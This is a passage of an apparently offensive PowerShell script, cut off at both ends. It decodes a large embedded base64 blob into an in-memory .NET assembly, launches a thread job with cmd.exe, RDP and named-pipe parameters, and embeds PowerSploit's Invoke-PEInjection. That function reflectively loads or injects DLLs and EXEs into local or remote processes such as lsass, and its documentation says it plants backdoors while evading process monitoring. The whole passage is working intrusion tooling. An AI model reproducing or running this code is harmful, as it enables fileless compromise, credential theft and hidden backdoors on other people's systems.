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')
[Byte[]] $DllBytes = $decoded -split ' '
$Assembly = [System.Reflection.Assembly]::Load($DllBytes)
Import-Module -Assembly $Assembly

start-ThreadJob -ScriptBlock {
param
(
    [String]$binary = "C:\windows\system32\cmd.exe",
    [bool]$RDP,
    [String]$PipeName
)

function onlytogettheoutput{

param
(
    [String]$binary = "C:\windows\system32\cmd.exe",
    [bool]$RDP,
    [String]$PipeName
)
function Invoke-PEInjection
{
<#
.SYNOPSIS

This script has two modes. It can reflectively load a DLL/EXE in to the PowerShell process, 
or it can reflectively load a DLL in to a remote process. These modes have different parameters and constraints, 
please lead the Notes section (GENERAL NOTES) for information on how to use them.

1.)Reflectively loads a DLL or EXE in to memory of the Powershell process.
Because the DLL/EXE is loaded reflectively, it is not displayed when tools are used to list the DLLs of a running process.

This tool can be run on remote servers by supplying a local Windows PE file (DLL/EXE) to load in to memory on the remote system,
this will load and execute the DLL/EXE in to memory without writing any files to disk.

2.) Reflectively load a DLL in to memory of a remote process.
As mentioned above, the DLL being reflectively loaded won't be displayed when tools are used to list DLLs of the running remote process.

This is probably most useful for injecting backdoors in SYSTEM processes in Session0. Currently, you cannot retrieve output
from the DLL. The script doesn't wait for the DLL to complete execution, and doesn't make any effort to cleanup memory in the 
remote process. 

PowerSploit Function: Invoke-PEInjection
Author: Joe Bialek, Twitter: @JosephBialek
Code review and modifications: Matt Graeber, Twitter: @mattifestation
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Reflectively loads a Windows PE file (DLL/EXE) in to the powershell process, or reflectively injects a DLL in to a remote process.

.PARAMETER PEBytes

A byte array containing a DLL/EXE to load and execute.

.PARAMETER ComputerName

Optional, an array of computernames to run the script on.

.PARAMETER FuncReturnType

Optional, the return type of the function being called in the DLL. Default: Void
	Options: String, WString, Void. See notes for more information.
	IMPORTANT: For DLLs being loaded remotely, only Void is supported.
	
.PARAMETER ExeArgs

Optional, arguments to pass to the executable being reflectively loaded.
	
.PARAMETER ProcName

Optional, the name of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ProcId

Optional, the process ID of the remote process to inject the DLL in to. If not injecting in to remote process, ignore this.

.PARAMETER ForceASLR

Optional, will force the use of ASLR on the PE being loaded even if the PE indicates it doesn't support ASLR. Some PE's will work with ASLR even
    if the compiler flags don't indicate they support it. Other PE's will simply crash. Make sure to test this prior to using. Has no effect when
    loading in to a remote process.

.PARAMETER DoNotZeroMZ

Optional, will not wipe the MZ from the first two bytes of the PE. This is to be used primarily for testing purposes and to enable loading the same PE with Invoke-PEInjection more than once.
	
.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on Target.local, print the wchar_t* returned by WStringFunc().
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-PEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName Target.local

.EXAMPLE

Load DemoDLL and run the exported function WStringFunc on all computers in the file targetlist.txt. Print
	the wchar_t* returned by WStringFunc() from all the computers.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL.dll')
Invoke-PEInjection -PEBytes $PEBytes -FuncReturnType WString -ComputerName (Get-Content targetlist.txt)

.EXAMPLE

Load DemoEXE and run it locally.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4"

.EXAMPLE

Load DemoEXE and run it locally. Forces ASLR on for the EXE.
$PEBytes = [IO.File]::ReadAllBytes('DemoEXE.exe')
Invoke-PEInjection -PEBytes $PEBytes -ExeArgs "Arg1 Arg2 Arg3 Arg4" -ForceASLR

.EXAMPLE

Refectively load DemoDLL_RemoteProcess.dll in to the lsass process on a remote computer.
$PEBytes = [IO.File]::ReadAllBytes('DemoDLL_RemoteProcess.dll')
Invoke-PEInjection -PEBytes $PEBytes -ProcName lsass -ComputerName Target.Local

.NOTES
GENERAL NOTES:
The script has 3 basic sets of functionality:
1.) Reflectively load a DLL in to the PowerShell process
	-Can return DLL output to user when run remotely or locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running pentest tools on remote computers without triggering process monitoring alerts.
	-By default, takes 3 function names, see below (DLL LOADING NOTES) for more info.
2.) Reflectively load an EXE in to the PowerShell process.
	-Can NOT return EXE output to user when run remotely. If remote output is needed, you must use a DLL. CAN return EXE output if run locally.
	-Cleans up memory in the PS process once the DLL finishes executing.
	-Great for running existing pentest tools which are EXE's without triggering process monitoring alerts.
3.) Reflectively inject a DLL in to a remote process.
	-Can NOT return DLL output to the user when run remotely OR locally.
	-Does NOT clean up memory in the remote process if/when DLL finishes execution.
	-Great for planting backdoor on a system by injecting backdoor DLL in to another processes memory.
	-Expects the DLL to have this function: void VoidFunc(). This is the function that will be called after the DLL is loaded.

DLL LOADING NOTES:

PowerShell does not capture an applications output if it is output using stdout, which is how Windows console apps output.
If you need to get back the output from the PE file you are loading on remote computers, you must compile the PE file as a DLL, and have the DLL
return a char* or wchar_t*, which PowerShell can take and read the output from. Anything output from stdout which is run using powershell
remoting will not be returned to you. If you just run the PowerShell script locally, you WILL be able to see the stdout output from
applications because it will just appear in the console window. The limitation only applies when using PowerShell remoting.

For DLL Loading:
Once this script loads the DLL, it calls a function in the DLL. There is a section near the bottom labeled "YOUR CODE GOES HERE"
I recommend your DLL take no parameters. I have prewritten code to handle functions which take no parameters are return
the following types: char*, wchar_t*, and void. If the function returns char* or wchar_t* the script will output the
returned data. The FuncReturnType parameter can be used to specify which return type to use. The mapping is as follows:
wchar_t*   : FuncReturnType = WString
char*      : FuncReturnType = String
void       : Default, don't supply a FuncReturnType

For the whcar_t* and char_t* options to work, you must allocate the string to the heap. Don't simply convert a string
using string.c_str() because it will be allocaed on the stack and be destroyed when the DLL returns.

The function name expected in the DLL for the prewritten FuncReturnType's is as follows:
WString    : WStringFunc
String     : StringFunc
Void       : VoidFunc

These function names ARE case sensitive. To create an exported DLL function for the wstring type, the function would
be declared as follows:
extern "C" __declspec( dllexport ) wchar_t* WStringFunc()


If you want to use a DLL which returns a different data type, or which takes parameters, you will need to modify
this script to accomodate this. You can find the code to modify in the section labeled "YOUR CODE GOES HERE".

Find a DemoDLL at: https://github.com/clymb3r/PowerShell/tree/master/Invoke-ReflectiveDllInjection

.LINK

http://clymb3r.wordpress.com/2013/04/06/reflective-dll-injection-with-powershell/

Blog on modifying mimikatz for reflective loading: http://clymb3r.wordpress.com/2013/04/09/modifying-mimikatz-to-be-loaded-using-invoke-reflectivedllinjection-ps1/
Blog on using this script as a backdoor with SQL server: http://www.casaba.com/blog/
#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0, Mandatory = $true)]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $PEBytes,
	
	[Parameter(Position = 1)]
	[String[]]
	$ComputerName,
	
	[Parameter(Position = 2)]
    [ValidateSet( 'WString', 'String', 'Void' )]
	[String]
	$FuncReturnType = 'Void',
	
	[Parameter(Position = 3)]
	[String]
	$ExeArgs,
	
	[Parameter(Position = 4)]
	[Int32]
	$ProcId,
	
	[Parameter(Position = 5)]
	[String]
	$ProcName,

    [Switch]
    $ForceASLR,

	[Switch]
	$DoNotZeroMZ
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
